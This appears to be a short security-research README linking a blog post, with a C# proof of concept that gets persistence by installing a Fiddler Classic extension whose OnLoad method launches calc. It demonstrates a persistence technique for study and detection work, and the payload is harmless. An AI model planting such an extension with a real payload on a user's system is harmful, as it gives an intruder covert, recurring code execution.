# Blog: https://nasbench.medium.com/persistence-with-fiddler-classic-extensions-80e4600e874d

A simple fiddler classic extension persistence POC

```c#
using System.Diagnostics;
using Fiddler;

[assembly: Fiddler.RequiredVersion("2.3.5.0")]

namespace POCFiddlerDotNet
{
    public class PersistencePOC : IFiddlerExtension
    {
        public PersistencePOC() { }

        public void OnLoad()
        {
            Process.Start("calc", "");
        }

        public void OnBeforeUnload()
        {
            //
        }
    }
}
```
